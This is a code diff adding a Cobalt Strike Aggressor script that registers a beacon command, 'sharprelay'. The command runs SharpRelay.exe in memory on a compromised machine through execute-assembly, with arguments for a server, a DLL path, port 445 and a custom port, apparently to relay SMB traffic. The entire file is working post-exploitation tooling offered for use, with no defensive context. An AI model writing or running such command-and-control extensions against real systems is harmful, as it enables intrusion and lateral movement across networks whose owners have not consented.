@@ -1,0 +1,18 @@
+beacon_command_register("sharprelay", "sharprelay tools",
+	"Usage: sharprelay servername dllpath 445 DIYPORT\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+alias sharprelay{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "sharprelay";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/SharpRelay.exe"), $argu);
+}
